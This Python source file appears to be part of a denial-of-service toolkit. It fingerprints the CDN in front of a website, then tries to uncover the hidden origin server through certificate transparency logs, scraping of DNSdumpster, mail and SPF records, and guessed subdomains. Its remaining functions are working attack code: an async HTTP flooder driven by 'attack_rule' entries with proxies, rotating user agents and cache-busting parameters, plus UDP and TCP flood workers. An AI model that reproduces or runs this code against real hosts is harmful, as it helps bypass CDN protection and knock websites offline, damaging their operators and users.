import requests
import random
import asyncio
import aiohttp
import json
import ssl
import re
import sys
import socket
import time
from urllib.parse import urlparse
import globals


try:
    import dns.resolver
    import dns.reversename
    from bs4 import BeautifulSoup
except ImportError:
    print("Error: Required libraries are missing. Please run:")
    print("pip install dnspython beautifulsoup4 lxml")
    sys.exit(1)


# CDN
CDN_SIGNATURES = {
    'Cloudflare': {
        'headers': {'server': ['cloudflare'], 'specific': ['__cfduid', 'cf-ray', 'cf-cache-status']},
        'cnames': ['cloudflare.net'], 'ns': ['cloudflare.com'], 'asns': ['AS13335']
    },
    'ArvanCloud': {
        'headers': {'server': ['ArvanCloud'], 'specific': ['x-ar-cache', 'ar-ray']},
        'cnames': ['arvancloud.com', 'arvancdn.com'], 'ns': ['arvancloud.ir'], 'asns': ['AS205104', 'AS58224']
    },
     'Amazon Web Services (AWS)': {
     'headers': {'server': ['awselb', 's3', 'CloudFront']},
     'cnames': ['amazonaws.com', 'cloudfront.net'], 'ns': ['awsdns'], 'asns': ['AS16509', 'AS14618']
    },
    'Google Cloud': {
        'headers': {'server': ['gws', 'gse'], 'specific': ['via']},
        'cnames': [], 'ns': ['google.com'], 'asns': ['AS15169', 'AS396982']
    },
    'Akamai': {
        'headers': {'specific': ['x-akamai-transformed', 'x-cache']},
        'cnames': ['akamai.net', 'akamaiedge.net'], 'ns': ['akam.net', 'akamai.net'], 'asns': ['AS20940', 'AS16625']
    },
    'Fastly': {
        'headers': {'specific': ['x-served-by', 'x-cache']},
        'cnames': [], 'ns': [], 'asns': ['AS54113']
    },
    'KeyCDN': {
        'headers': {'server': ['keycdn-engine'], 'specific': ['x-pull']},
        'cnames': ['keycdn.com'], 'ns': [], 'asns': ['AS51065']
    },
    'StackPath (MaxCDN)': {
        'headers': {'server': ['NetDNA-cache']},
        'cnames': ['stackpathcdn.com', 'netdna-cdn.com'], 'ns': [], 'asns': ['AS21828']
    },
    'BunnyCDN': {
        'headers': {'server': ['BunnyCDN']},
        'cnames': ['b-cdn.net'], 'ns': [], 'asns': ['AS204733']
    },
    'CDN77': {
        'headers': {'server': ['CDN77']},
        'cnames': ['cdn77.org', 'cdn77.net'], 'ns': [], 'asns': ['AS60068']
    },
    'Imperva (Incapsula)': {
        'headers': {'specific': ['x-iinfo', 'x-cdn']},
        'cnames': [], 'ns': [], 'asns': ['AS19551']
    },
    'CacheFly': {
        'headers': {}, 'cnames': ['cachefly.net'], 'ns': [], 'asns': ['AS30081']
    },
    'Microsoft Azure CDN': {
        'headers': {'server': ['Microsoft-IIS'], 'specific': ['x-cdn']},
        'cnames': ['azureedge.net'], 'ns': [], 'asns': ['AS8075']
    },
    'Edgecast (Verizon Media)': {
        'headers': {'server': ['ECS']},
        'cnames': ['edgecastcdn.net'], 'ns': [], 'asns': ['AS15133']
    },
    'Limelight Networks': {
        'headers': {'server': ['LLNW']},
        'cnames': ['llnwd.net'], 'ns': [], 'asns': ['AS22822']
    },
    'OVH CDN': {
        'headers': {'specific': ['x-cache']},
        'cnames': ['ovh.com'], 'ns': [], 'asns': ['AS16276']
    },
    'Leaseweb CDN': {
        'headers': {}, 'cnames': ['lswcdn.net'], 'ns': [], 'asns': ['AS60781']
    },
    'Gcore': {
        'headers': {'server': ['G-Core']},
        'cnames': [], 'ns': ['gcore.com'], 'asns': ['AS199524']
    },
    'BelugaCDN': {
        'headers': {'server': ['BelugaCDN']},
        'cnames': [], 'ns': [], 'asns': ['AS200074']
    },
    'CDNify': {
        'headers': {'server': ['CDNify']},
        'cnames': ['cdnify.io'], 'ns': [], 'asns': ['AS202422']
    },
    'CDNsun': {
        'headers': {'server': ['CDNsun']},
        'cnames': ['cdnsun.net'], 'ns': [], 'asns': ['AS202781']
    },
    'CDNlion': {
        'headers': {'server': ['CDNlion']},
        'cnames': ['cdnlion.com'], 'ns': [], 'asns': []
    },
    'Tata Communications CDN': {
        'headers': {'server': ['Tata Communications']},
        'cnames': [], 'ns': [], 'asns': ['AS6453']
    },
    'Wangsu Science & Technology (ChinaNetCenter)': {
        'headers': {'server': ['WS-CDN', 'ChinaNetCenter']},
        'cnames': ['wscloudcdn.com'], 'ns': [], 'asns': ['AS45167']
    },
    'ChinaCache': {
        'headers': {'server': ['ChinaCache']},
        'cnames': ['ccgslb.com.cn'], 'ns': [], 'asns': ['AS4837']
    },
    'Lumen (CenturyLink)': {
        'headers': {}, 'cnames': ['lumen.com'], 'ns': [], 'asns': ['AS209', 'AS3356']
    },
    'Medianova': {
        'headers': {'server': ['Medianova']},
        'cnames': [], 'ns': [], 'asns': ['AS47332']
    },
    'CDNetworks': {
        'headers': {'server': ['CDNetworks']},
        'cnames': ['cdngslb.com'], 'ns': [], 'asns': ['AS36674']
    },
    'Quantil': {
        'headers': {'server': ['QUANTIL']},
        'cnames': ['quantil.com'], 'ns': [], 'asns': ['AS40065']
    },
    'Tencent Cloud CDN': {
        'headers': {'server': ['Tengine']},
        'cnames': ['dnsv1.com', 'qcloudcdn.com'], 'ns': [], 'asns': ['AS132203', 'AS45090']
    },
    'Alibaba Cloud CDN': {
        'headers': {'server': ['Tengine'], 'specific': ['x-cache', 'via']},
        'cnames': ['alikunlun.com', 'alibabacloudcdn.com'], 'ns': [], 'asns': ['AS37963', 'AS45102']
    },
    'DigiCDN (Custom)': {
        'headers': {'server': ['DigiCDN Edge']},
        'cnames': [], 'ns': [], 'asns': ['AS206456']
    }
}


def dns_worker(hostname, repetitions_per_thread):
    resolver = dns.resolver.Resolver()
    for _ in range(repetitions_per_thread):
        for record_type in ['A', 'AAAA']:
            try:
                answers = resolver.resolve(hostname, record_type)
                for rdata in answers:
                    ip_address = rdata.to_text()
                    with globals.results_lock:
                        if ip_address not in globals.resolved_ip_details:
                            globals.resolved_ip_details[ip_address] = {'status': 'pending'}
                    
                    if globals.resolved_ip_details[ip_address].get('status') == 'pending':
                        try:
                            ip_info_response = requests.get(f"http://ip-api.com/json/{ip_address}?fields=query,country,city,isp,as")
                            if ip_info_response.status_code == 200:
                                ip_data = ip_info_response.json()
                                ip_data['type'] = 'IPv6' if record_type == 'AAAA' else 'IPv4'
                                try:
                                    rev_name = dns.reversename.from_address(ip_address)
                                    ptr_answer = resolver.resolve(rev_name, "PTR")
                                    ip_data['ptr'] = ptr_answer[0].to_text().rstrip('.')
                                except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.exception.Timeout, Exception):
                                    ip_data['ptr'] = 'Not found'
                                with globals.results_lock:
                                    globals.resolved_ip_details[ip_address] = ip_data
                            else:
                                with globals.results_lock:
                                    globals.resolved_ip_details[ip_address] = {'status': 'failed'}
                        except requests.RequestException:
                            with globals.results_lock:
                                globals.resolved_ip_details[ip_address] = {'status': 'failed'}
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
                continue

def analyze_target(hostname):
    findings = {
        'cname': None, 'a_records': [], 'ns_records': [], 'headers': None, 'ip_info': None,
        'cdn_provider': 'Unknown', 'detection_reason': 'No direct evidence found.'
    }
    try:
        resolver = dns.resolver.Resolver()
        findings['a_records'] = sorted([r.to_text() for r in resolver.resolve(hostname, 'A')])
        domain_parts = hostname.split('.')
        root_domain = '.'.join(domain_parts[-2:]) if len(domain_parts) > 1 else hostname
        findings['ns_records'] = sorted([r.to_text().rstrip('.') for r in resolver.resolve(root_domain, 'NS')])
        try:
            cname_answers = resolver.resolve(hostname, 'CNAME')
            findings['cname'] = cname_answers[0].target.to_text().rstrip('.')
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN): pass
        for provider, sigs in CDN_SIGNATURES.items():
            if any(c in findings['cname'] for c in sigs['cnames'] if findings['cname']):
                findings['cdn_provider'], findings['detection_reason'] = provider, f"CNAME record points to '{findings['cname']}'"
                break
            if any(ns_sig in ns_rec for ns_sig in sigs['ns'] for ns_rec in findings['ns_records']):
                findings['cdn_provider'], findings['detection_reason'] = provider, f"NS records point to '{provider}'"
                break
    except Exception: pass
    if findings['cdn_provider'] == 'Unknown':
        for proto in ['https', 'http']:
            try:
                response = requests.get(f"{proto}://{hostname}", timeout=7, allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0'})
                if response.status_code < 500:
                    findings['headers'] = response.headers
                    server_header = response.headers.get('Server', '').lower()
                    for provider, sigs in CDN_SIGNATURES.items():
                        if any(s.lower() in server_header for s in sigs['headers'].get('server', [])) or \
                           any(h.lower() in (k.lower() for k in response.headers.keys()) for h in sigs['headers'].get('specific', [])):
                            findings['cdn_provider'], findings['detection_reason'] = provider, f"Detected via HTTP headers (e.g., Server: {response.headers.get('Server')})"
                            break
                    if findings['cdn_provider'] != 'Unknown': break
            except requests.RequestException: continue
    if findings['cdn_provider'] == 'Unknown' and findings['a_records']:
        try:
            ip_address = findings['a_records'][0]
            ip_info_response = requests.get(f"http://ip-api.com/json/{ip_address}?fields=query,country,isp,org,as")
            if ip_info_response.status_code == 200:
                ip_data = ip_info_response.json()
                findings['ip_info'] = ip_data
                asn = ip_data.get('as', '').split(' ')[0]
                for provider, sigs in CDN_SIGNATURES.items():
                    if any(asn_sig in asn for asn_sig in sigs['asns']):
                         findings['cdn_provider'], findings['detection_reason'] = provider, f"IP belongs to ASN '{ip_data.get('as')}'"
                         break
        except requests.RequestException: pass
    return findings


def _get_subdomains_from_crtsh(hostname):
    print("  [*] Querying Certificate Transparency logs (via crt.sh)...")
    found_ips = set()
    url = f"https://crt.sh/?q=%.{hostname}&output=json"
    headers = {'User-Agent': 'Mozilla/5.0'}
    
    try:
        response = requests.get(url, headers=headers, timeout=20)
        if response.status_code == 200:
            subdomains = set()
            json_response = response.json()
            if not json_response:
                print("  [-] No certificate transparency logs found on crt.sh.")
                return []

            for entry in json_response:
                names = entry.get('name_value', '').split('\n')
                for name in names:
                    if name.strip() and not name.startswith('*.'):
                        subdomains.add(name.strip())
            
            resolver = dns.resolver.Resolver()
            print(f"  [*] Resolving {len(subdomains)} unique subdomains found in certificates...")
            for sub in subdomains:
                try:
                    answers = resolver.resolve(sub, 'A')
                    for rdata in answers:
                        found_ips.add(rdata.to_text())
                except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.exception.Timeout):
                    continue
    except requests.RequestException as e:
        print(f"  [-] Could not fetch data from crt.sh: {e}")
    except json.JSONDecodeError:
        print("  [-] Failed to parse JSON response from crt.sh.")
        
    return list(found_ips)

def _get_dns_history_from_dnsdumpster(hostname):
    print("  [*] Querying passive DNS records (via DNSdumpster)...")
    found_ips = set()
    session = requests.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Referer': 'https://dnsdumpster.com/'
    }

    try:
        initial_res = session.get('https://dnsdumpster.com/', headers=headers, timeout=20)
        initial_res.raise_for_status()
        soup = BeautifulSoup(initial_res.content, 'lxml')
        
        csrf_token_tag = soup.find('input', {'name': 'csrfmiddlewaretoken'})
        if not csrf_token_tag:
            print("  [-] Could not find CSRF token on DNSdumpster. The site may have changed.")
            return []
        csrf_token = csrf_token_tag['value']

        data = {'csrfmiddlewaretoken': csrf_token, 'targetip': hostname, 'user': 'free'}
        post_res = session.post('https://dnsdumpster.com/', headers=headers, data=data, timeout=20)
        post_res.raise_for_status()

        ip_regex = r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
        matches = re.findall(ip_regex, post_res.text)
        for ip in matches:
            found_ips.add(ip)
            
    except requests.exceptions.RequestException as e:
        print(f"  [-] Network error while connecting to DNSdumpster: {e}")
    except (TypeError, KeyError, AttributeError):
        print("  [-] Failed to parse DNSdumpster response. The site structure may have changed.")
        
    return list(found_ips)

def _scan_email_records(hostname):
    print("  [*] Analyzing email-related DNS records (MX, SPF, DMARC)...")
    found_ips = set()
    resolver = dns.resolver.Resolver()

    try:
        mx_records = resolver.resolve(hostname, 'MX')
        for mx in mx_records:
            mail_server = mx.exchange.to_text().rstrip('.')
            try:
                mail_ips = resolver.resolve(mail_server, 'A')
                for ip in mail_ips:
                    found_ips.add(ip.to_text())
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.exception.Timeout):
                continue
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.exception.Timeout):
        pass

    try:
        txt_records = resolver.resolve(hostname, 'TXT')
        for record in txt_records:
            record_str = record.to_text().lower()
            if 'v=spf1' in record_str:
                parts = record_str.split()
                for part in parts:
                    if part.startswith('ip4:'):
                        found_ips.add(part[4:])
                    elif part.startswith('include:'):
                        try:
                            include_domain = part[8:]
                            include_ips = resolver.resolve(include_domain, 'A')
                            for ip in include_ips:
                                found_ips.add(ip.to_text())
                        except Exception:
                            continue
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.exception.Timeout):
        pass
        
    return list(found_ips)

def _scan_subdomains(hostname, subdomains):
    found_ips = set()
    resolver = dns.resolver.Resolver()
    print(f"  [*] Scanning {len(subdomains)} subdomains...")
    for sub in subdomains:
        try:
            target = f"{sub}.{hostname}"
            answers = resolver.resolve(target, 'A')
            for rdata in answers:
                found_ips.add(rdata.to_text())
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.exception.Timeout):
            continue
    return list(found_ips)


def find_origin_server(hostname, method=None):
    print(f"\n[!] Step 1: Identifying known CDN IPs for {hostname}...")
    resolver = dns.resolver.Resolver()
    cdn_ips = set()
    try:
        answers = resolver.resolve(hostname, 'A')
        for rdata in answers:
            cdn_ips.add(rdata.to_text())
        print(f"  [*] Found current public IPs: {', '.join(cdn_ips)}")
    except Exception as e:
        print(f"  [-] Could not resolve main domain: {e}")

    globals.origin_results = {
        'cdn_ips': list(cdn_ips),
        'methods': {}
    }
    
    print("\n[!] Step 2: Searching for misconfigured records and historical data...")

    crt_ips = _get_subdomains_from_crtsh(hostname)
    potential_crt_ips = [ip for ip in crt_ips if ip not in cdn_ips]
    globals.origin_results['methods']['Certificate Transparency Scan'] = potential_crt_ips

    historical_ips = _get_dns_history_from_dnsdumpster(hostname)
    potential_historical_ips = [ip for ip in historical_ips if ip not in cdn_ips]
    globals.origin_results['methods']['Passive DNS Analysis (DNSdumpster)'] = potential_historical_ips

    email_ips = _scan_email_records(hostname)
    potential_email_ips = [ip for ip in email_ips if ip not in cdn_ips]
    globals.origin_results['methods']['Email Record Analysis'] = potential_email_ips

    print("\n[!] Step 3: Performing targeted subdomain scans...")
    
    subdomains_to_scan = []
    scan_method_name = "General Subdomain Scan"

    if method:
        method = method.lower()
        if method == 'arvancloud':
            scan_method_name = 'ArvanCloud Subdomain Scan'
            subdomains_to_scan = [
                'direct', 'direct-connect', 'ftp', 'cpanel', 'webmail', 'mail',
                'server', 'dev', 'staging', 'backup', 'panel', 'sso', 'api', 'files'
            ]
        elif method == 'cloudflare':
            scan_method_name = 'Cloudflare Subdomain Scan'
            subdomains_to_scan = [
                'ftp', 'mail', 'webmail', 'direct', 'direct-connect', 'cpanel', 'plesk',
                'origin', 'dev', 'staging', 'beta', 'test', 'api', 'blog'
            ]
        else:
            print(f"Warning: Unknown method '{method}'. Falling back to general scan.")

    if not subdomains_to_scan:
        subdomains_to_scan = [
            'ftp', 'cpanel', 'webmail', 'mail', 'dns', 'admin', 'portal', 'test',
            'direct', 'origin', 'dev', 'staging', 'api', 'blog', 'backup'
        ]

    sub_ips = _scan_subdomains(hostname, subdomains_to_scan)
    potential_sub_ips = [ip for ip in sub_ips if ip not in cdn_ips]
    globals.origin_results['methods'][scan_method_name] = potential_sub_ips




async def async_send_request(session, base_url, data_files, proxy, attack_rule, semaphore, debug=False):
    async with semaphore:
        method = attack_rule.get('method', 'GET')
        path = attack_rule.get('path', '/')
        target_url = base_url.rstrip('/') + path

        user_agent = random.choice(data_files['user_agents']) if data_files['user_agents'] else 'AdvancedStressTester/3.0'
        headers = random.choice(data_files['headers']).copy() if data_files['headers'] else {}
        headers['User-Agent'] = user_agent

        if attack_rule.get('random_params'):
            separator = '&' if '?' in target_url else '?'
            target_url += f"{separator}_={random.randint(10000, 99999)}"

        payload_kwargs = {}
        if 'payload_file' in attack_rule:
            try:
                with open(attack_rule['payload_file'], 'r', encoding='utf-8') as f:
                    if attack_rule['payload_file'].endswith('.json'):
                        payload_kwargs['json'] = json.load(f)
                        if 'Content-Type' not in headers:
                            headers['Content-Type'] = 'application/json'

                    else:
                        payload_kwargs['data'] = f.read().strip()
                        if 'Content-Type' not in headers:
                            headers['Content-Type'] = 'application/x-www-form-urlencoded'

            except Exception as e:
                print(f"Warning: Could not read payload file {attack_rule['payload_file']}: {e}")

        if debug:
            print(f"[DEBUG] -> {method} {target_url} | Proxy: {proxy or 'None'}", flush=True)

        normalized_proxy = None
        if proxy:
            if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
                normalized_proxy = f"http://{proxy}"
            else:
                normalized_proxy = proxy

        try:
            timeout = aiohttp.ClientTimeout(total=20)
            async with session.request(
                method, target_url, headers=headers, proxy=normalized_proxy, 
                timeout=timeout, **payload_kwargs
            ) as response:
                status_code = response.status
                with globals.results_lock:
                    globals.results["details"][status_code] = globals.results["details"].get(status_code, 0) + 1
                    if 200 <= status_code < 400:
                        globals.results["success"] += 1
                    else:
                        globals.results["fail"] += 1
        except Exception as e:
            error_name = type(e).__name__
            with globals.results_lock:
                globals.results["fail"] += 1
                globals.results["details"][error_name] = globals.results["details"].get(error_name, 0) + 1


def udp_flood_worker(ip, port, duration, size):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_data = random._urandom(size)
    
    packets_sent = 0
    bytes_sent = 0

    while time.time() < end_time:
        try:
            sock.sendto(packet_data, (ip, port))
            packets_sent += 1
            bytes_sent += size
        except Exception:
            pass
    
    with globals.results_lock:
        globals.results['packets_sent'] += packets_sent
        globals.results['bytes_sent'] += bytes_sent

def tcp_flood_worker(ip, port, duration):
    end_time = time.time() + duration
    packets_sent = 0

    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, port))
            sock.close()
            packets_sent += 1
        except Exception:
            pass
    
    with globals.results_lock:
        globals.results['packets_sent'] += packets_sent
